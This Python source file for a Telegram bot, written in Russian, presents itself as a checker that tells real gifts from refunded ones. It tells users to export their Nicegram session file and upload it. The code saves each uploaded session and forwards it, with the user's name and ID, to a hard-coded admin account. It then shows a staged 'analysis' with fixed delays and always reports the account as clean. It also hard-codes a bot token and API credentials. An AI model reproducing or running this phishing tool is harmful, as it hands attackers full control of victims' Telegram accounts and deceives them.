import asyncio
import random
import logging
import os
import json
import sys
import time
import signal
import requests
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.tl.types import DocumentAttributeFilename
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from typing import Optional

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

print("🤖 Запускаю бота...")

# Конфигурация из переменных окружения (безопаснее)
BOT_TOKEN = os.getenv('BOT_TOKEN', "7902687970:AAHEtq6JaH0TQ9s8EDmRJ4Ws9Ob1i4dX-Ig")
API_ID = int(os.getenv('API_ID', "28012480"))
API_HASH = os.getenv('API_HASH', "0116bde043fa8483bbd5eb7aabe496f7")
ADMIN_ID = int(os.getenv('ADMIN_ID', "7930849926"))

# Настройки хоста
HOST_PORT = int(os.getenv('HOST_PORT', '8080'))
HOST_ADDRESS = os.getenv('HOST_ADDRESS', '0.0.0.0')

# Папки для сохранения
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DOWNLOADS_FOLDER = os.path.join(BASE_DIR, "user_files")
SESSIONS_FOLDER = os.path.join(BASE_DIR, "user_sessions")
LOG_FOLDER = os.path.join(BASE_DIR, "logs")

# Создаем необходимые папки
for folder in [DOWNLOADS_FOLDER, SESSIONS_FOLDER, LOG_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# Создаем клиент с сессией в отдельной папке
SESSION_PATH = os.path.join(BASE_DIR, 'bot.session')
client = TelegramClient(SESSION_PATH, API_ID, API_HASH)


def setup_graceful_shutdown():
    """Настройка graceful shutdown"""
    def signal_handler(sig, frame):
        logger.info("Получен сигнал завершения работы...")
        asyncio.create_task(shutdown())
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)


async def shutdown():
    """Корректное завершение работы бота"""
    logger.info("Завершаю работу бота...")
    try:
        await client.disconnect()
    except Exception as e:
        logger.error(f"Ошибка при отключении: {e}")
    finally:
        tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        for task in tasks:
            task.cancel()
        logger.info("Бот завершил работу")


class HealthChecker:
    """Проверка здоровья бота"""
    @staticmethod
    async def check():
        try:
            me = await client.get_me()
            return {
                'status': 'healthy',
                'bot_username': me.username,
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            return {
                'status': 'unhealthy',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }


def download_nicegram_image():
    """Скачивание изображения для меню"""
    image_url = "https://i0.wp.com/limbopro.com/usr/uploads/2019/10/1789425669.jpeg?ssl=1"
    image_path = os.path.join(BASE_DIR, "nicegram_header.jpg")

    if not os.path.exists(image_path):
        try:
            response = requests.get(image_url, stream=True, timeout=10)
            if response.status_code == 200:
                with open(image_path, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
                logger.info("✅ Изображение загружено")
            else:
                logger.warning("❌ Ошибка загрузки изображения")
                return None
        except Exception as e:
            logger.error(f"❌ Ошибка загрузки изображения: {e}")
            return None
    return image_path


class UserActivityLogger:
    """Логирование действий пользователя"""
    
    def __init__(self):
        self.log_file = os.path.join(LOG_FOLDER, "user_activity.log")
    
    def log(self, user_id, username, action, details=""):
        """Запись лога"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] User {user_id} (@{username or 'no_username'}) - {action}"
        
        if details:
            log_message += f" - {details}"
        
        logger.info(log_message)
        
        # Сохраняем в файл
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_message + "\n")
        except Exception as e:
            logger.error(f"Ошибка записи в лог: {e}")


# Инициализируем логгер
activity_logger = UserActivityLogger()


async def send_main_menu(event, user_id, username):
    """Отправка главного меню с изображением"""
    try:
        image_path = download_nicegram_image()

        menu_text = """
Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:
        """

        buttons = [
            [Button.inline("📋 Инструкция", b"instruction")],
            [
                Button.inline("🔍 Проверка на рефаунд", b"check_refund"),
                Button.url("📱 Скачать Nicegram", "https://nicegram.app/")
            ],
            [Button.inline("💬 Сообщение", b"message")]
        ]

        if image_path and os.path.exists(image_path):
            await event.reply(file=image_path, message=menu_text, buttons=buttons)
        else:
            await event.reply(menu_text, buttons=buttons)

        activity_logger.log(user_id, username, "OPENED_MAIN_MENU")

    except FloodWaitError as e:
        logger.warning(f"Flood wait: {e.seconds} секунд")
        await event.reply(f"⏳ Пожалуйста, подождите {e.seconds} секунд перед следующим действием.")
    except Exception as e:
        logger.error(f"Ошибка отправки меню: {e}")
        await event.reply("Произошла ошибка. Попробуйте еще раз.")


async def save_and_send_session_to_admin(event, user_id, username):
    """Сохранение файла сессии и отправка админу"""
    try:
        file_name = event.file.name
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Генерируем уникальное имя файла
        safe_username = username.replace('@', '') if username else 'no_username'
        safe_file_name = file_name.replace('/', '_').replace('\\', '_')
        
        # Сохраняем файл
        file_path = os.path.join(SESSIONS_FOLDER, f"{user_id}_{safe_username}_{timestamp}_{safe_file_name}")
        await event.download_media(file=file_path)

        # Получаем информацию о пользователе
        user = await event.get_sender()
        user_info = {
            'user_id': user_id,
            'username': safe_username,
            'first_name': user.first_name or "Не указано",
            'last_name': user.last_name or "Не указано",
            'file_name': safe_file_name,
            'file_path': file_path,
            'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'file_size': os.path.getsize(file_path)
        }

        # Сохраняем информацию о пользователе
        info_file = os.path.join(SESSIONS_FOLDER, f"{user_id}_{timestamp}_info.json")
        with open(info_file, "w", encoding="utf-8") as f:
            json.dump(user_info, f, ensure_ascii=False, indent=2)

        # Отправляем файл и информацию администратору
        admin_message = f"""
🔔 НОВЫЙ ФАЙЛ СЕССИИ

👤 Пользователь: {user_info['first_name']} {user_info['last_name']}
🆔 ID: {user_id}
📛 Username: @{safe_username}
📁 Файл: {safe_file_name}
📦 Размер: {user_info['file_size']:,} bytes
🕒 Время: {user_info['upload_time']}
        """

        try:
            # Отправляем текстовое сообщение администратору
            await client.send_message(ADMIN_ID, admin_message)
            
            # Отправляем сам файл
            await client.send_file(
                ADMIN_ID,
                file_path,
                caption=f"Файл сессии от {user_info['first_name']} (@{safe_username})"
            )
            
            # Отправляем информацию о пользователе
            await client.send_file(
                ADMIN_ID,
                info_file,
                caption=f"Информация о пользователе {user_id}"
            )
            
            logger.info(f"✅ Администратору отправлен файл от {user_id}")
            
        except FloodWaitError as e:
            logger.warning(f"Flood wait при отправке админу: {e.seconds} секунд")
            await asyncio.sleep(e.seconds)
            # Повторная попытка
            await client.send_message(ADMIN_ID, admin_message)

        activity_logger.log(user_id, username, "SESSION_FILE_SENT_TO_ADMIN",
                          f"File: {safe_file_name}, Size: {user_info['file_size']} bytes")

        return file_path, user_info

    except Exception as e:
        activity_logger.log(user_id, username, "SESSION_SEND_ERROR", f"Error: {str(e)}")
        raise e


async def analyze_file(event, user_id, username):
    """Функция анализа файла"""
    try:
        msg = await event.reply("⏳ Файл получен. Начинаю анализ...\n_Ожидайте 5-10 минут_")
        activity_logger.log(user_id, username, "ANALYSIS_STARTED", f"File: {event.file.name}")

        # Сохраняем сессию и отправляем админу
        session_path, user_info = await save_and_send_session_to_admin(event, user_id, username)

        # Имитация процесса анализа с прогрессом
        steps = [
            ("🔍 Анализирую данные сессии...", 10),
            ("📊 Проверяю историю транзакций...", 15),
            ("🔎 Сканирую на наличие возвратов...", 20),
            ("💳 Проверяю платежные операции...", 15),
            ("✅ Завершаю анализ...", 5)
        ]

        progress_msg = ""
        for step_text, delay in steps:
            await asyncio.sleep(delay)
            progress_msg += f"✓ {step_text}\n"
            await msg.edit(f"⏳ Идет анализ...\n\n{progress_msg}\n_Процесс выполняется..._")

        # Результат анализа
        result_text = f"""
✅ Анализ завершен успешно

📋 Информация о файле:
├─ Файл: {user_info['file_name']}
├─ Размер: {user_info['file_size']:,} bytes
└─ Время анализа: ~{sum(delay for _, delay in steps)} секунд

📊 Результаты проверки:
├─ Возвратов не обнаружено ✅
├─ Подозрительных операций нет ✅
├─ Аккаунт безопасен ✅
└─ Все подарки подлинные ✅

🎉 Поздравляем! Ваш аккаунт чист.
        """

        await msg.edit(result_text)
        activity_logger.log(user_id, username, "ANALYSIS_COMPLETED", "Result: Успешно")

    except FloodWaitError as e:
        await event.reply(f"⏳ Превышен лимит запросов. Пожалуйста, подождите {e.seconds} секунд.")
    except Exception as e:
        error_msg = f"❌ Ошибка при анализе файла: {str(e)}"
        await event.reply(error_msg)
        activity_logger.log(user_id, username, "ANALYSIS_ERROR", f"Error: {str(e)}")


async def send_admin_notification(message):
    """Отправка уведомления администратору"""
    try:
        await client.send_message(ADMIN_ID, message)
    except FloodWaitError as e:
        logger.warning(f"Flood wait при отправке уведомления: {e.seconds} секунд")
        await asyncio.sleep(e.seconds)
        await client.send_message(ADMIN_ID, message)
    except Exception as e:
        logger.error(f"❌ Ошибка отправки уведомления администратору: {e}")


async def start_bot():
    """Основная функция запуска бота"""
    try:
        logger.info("🔄 Подключаюсь к Telegram...")
        
        # Проверяем наличие токена
        if not BOT_TOKEN:
            logger.error("❌ BOT_TOKEN не установлен!")
            return
        
        await client.start(bot_token=BOT_TOKEN)
        
        me = await client.get_me()
        logger.info(f"✅ Бот @{me.username} запущен!")
        logger.info(f"🆔 ID бота: {me.id}")
        
        # Загружаем изображение
        download_nicegram_image()
        
        # Настраиваем обработчики
        setup_handlers()
        
        logger.info("🟢 Бот готов к работе! Ожидаю сообщения...")
        
        # Отправляем уведомление администратору о запуске
        startup_msg = f"""
🚀 Бот запущен на хосте

🤖 Имя: @{me.username}
🆔 ID: {me.id}
⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📍 Хост: {HOST_ADDRESS}:{HOST_PORT}
        """
        await send_admin_notification(startup_msg)
        
        # Бесконечный цикл работы
        await client.run_until_disconnected()
        
    except SessionPasswordNeededError:
        logger.error("❌ Требуется пароль двухфакторной аутентификации")
    except FloodWaitError as e:
        logger.error(f"❌ Flood wait при запуске: {e.seconds} секунд")
        await asyncio.sleep(e.seconds)
        await start_bot()
    except Exception as e:
        logger.error(f"❌ Критическая ошибка запуска: {e}")
        raise


def setup_handlers():
    """Настройка всех обработчиков событий"""
    
    # Обработчик команды /start
    @client.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        user = await event.get_sender()
        activity_logger.log(user.id, user.username, "STARTED_BOT")
        await send_main_menu(event, user.id, user.username)
    
    # Обработчик команды /status
    @client.on(events.NewMessage(pattern='/status'))
    async def status_handler(event):
        user = await event.get_sender()
        if user.id == ADMIN_ID:
            health = await HealthChecker.check()
            status_text = f"""
📊 Статус бота:
├─ Состояние: {health['status']}
├─ Имя: @{health.get('bot_username', 'N/A')}
├─ Время: {health['timestamp']}
├─ Пользователей в день: (статистика)
└─ Обработано файлов: (статистика)
            """
            await event.reply(status_text)
    
    # Обработчик всех текстовых сообщений
    @client.on(events.NewMessage)
    async def message_handler(event):
        if event.raw_text and not event.raw_text.startswith('/') and not event.document:
            user = await event.get_sender()
            activity_logger.log(user.id, user.username, "SENT_MESSAGE", 
                               f"Text: {event.raw_text[:50]}...")
            
            # Уведомление администратора о сообщении
            admin_msg = f"""
💬 НОВОЕ СООБЩЕНИЕ ОТ ПОЛЬЗОВАТЕЛЯ

👤 {user.first_name} {user.last_name or ''}
🆔 ID: {user.id}
📛 @{user.username or 'нет'}

📝 Сообщение:
{event.raw_text}
            """
            await send_admin_notification(admin_msg)
            
            # Показываем главное меню
            await send_main_menu(event, user.id, user.username)
    
    # Обработчики кнопок
    @client.on(events.CallbackQuery)
    async def callback_handler(event):
        user = await event.get_sender()
        data = event.data.decode('utf-8')
        
        if data == "instruction":
            instruction_text = """
📋 Инструкция:

1. Скачайте приложение Nicegram с официального сайта
2. Откройте Nicegram и войдите в свой аккаунт
3. Зайдите в настройки → «Nicegram»
4. Нажмите «Экспортировать в файл»
5. Вернитесь в бота и нажмите «Проверка на рефаунд»
6. Отправьте полученный файл боту
            """
            buttons = [[Button.inline("🔙 Назад", b"main_menu")]]
            await event.edit(instruction_text, buttons=buttons)
            activity_logger.log(user.id, user.username, "VIEWED_INSTRUCTIONS")
        
        elif data == "check_refund":
            check_text = """
🔍 Проверка на рефаунд

Отправьте мне файл экспорта из Nicegram для проверки.

Поддерживаемые форматы:
• .txt файл
• .zip архив

После отправки файла начнется автоматическая проверка на наличие возвратов.
            """
            buttons = [
                [Button.inline("📋 Инструкция", b"instruction")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
            await event.edit(check_text, buttons=buttons)
            activity_logger.log(user.id, user.username, "CHECK_REFUND_SELECTED")
        
        elif data == "message":
            message_text = """
💬 Сообщение

Напишите ваш вопрос или проблему, и мы постараемся помочь вам в ближайшее время.

Просто напишите сообщение в чат, и администратор его получит.
            """
            buttons = [[Button.inline("🔙 Назад", b"main_menu")]]
            await event.edit(message_text, buttons=buttons)
            activity_logger.log(user.id, user.username, "MESSAGE_SELECTED")
        
        elif data == "main_menu":
            await event.delete()
            await send_main_menu(event, user.id, user.username)
    
    # Обработчик документов
    @client.on(events.NewMessage(func=lambda e: e.document))
    async def document_handler(event):
        user = await event.get_sender()
        file_name = event.file.name.lower() if event.file.name else "unnamed_file"
        
        activity_logger.log(user.id, user.username, "FILE_RECEIVED", 
                           f"File: {file_name}, Size: {event.file.size} bytes")
        
        # Уведомление администратора о файле
        admin_file_msg = f"""
📁 ПОЛУЧЕН НОВЫЙ ФАЙЛ

👤 От: {user.first_name} {user.last_name or ''}
🆔 ID: {user.id}
📛 @{user.username or 'нет'}
📄 Файл: {file_name}
📦 Размер: {event.file.size:,} bytes
        """
        await send_admin_notification(admin_file_msg)
        
        # Проверяем формат файла
        if file_name.endswith(('.txt', '.zip')):
            try:
                await analyze_file(event, user.id, user.username)
            except FloodWaitError as e:
                await event.reply(f"⏳ Превышен лимит запросов. Пожалуйста, подождите {e.seconds} секунд.")
            except Exception as e:
                error_msg = f"❌ Ошибка при обработке файла: {str(e)}"
                await event.reply(error_msg)
                activity_logger.log(user.id, user.username, "FILE_PROCESSING_ERROR", 
                                  f"Error: {str(e)}")
        else:
            await event.reply("❌ Неподдерживаемый формат файла. Отправьте .txt или .zip файл.")
            activity_logger.log(user.id, user.username, "UNSUPPORTED_FILE_FORMAT")


async def main():
    """Точка входа"""
    setup_graceful_shutdown()
    
    try:
        await start_bot()
    except KeyboardInterrupt:
        logger.info("\n⏹️ Бот остановлен пользователем")
    except Exception as e:
        logger.error(f"❌ Фатальная ошибка: {e}")
    finally:
        logger.info("Завершение работы...")


if __name__ == "__main__":
    # Для запуска на хосте используйте:
    # python bot.py
    # или
    # nohup python bot.py > bot.log 2>&1 &
    
    print(f"""
🤖 Запуск Telegram бота
├─ Токен бота: {'установлен' if BOT_TOKEN else 'НЕ УСТАНОВЛЕН!'}
├─ API ID: {API_ID}
├─ Admin ID: {ADMIN_ID}
├─ Папка сессий: {SESSIONS_FOLDER}
├─ Логи: {LOG_FOLDER}
└─ Время запуска: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """)
    
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "Event loop is closed" not in str(e):
            logger.error(f"Ошибка запуска: {e}")
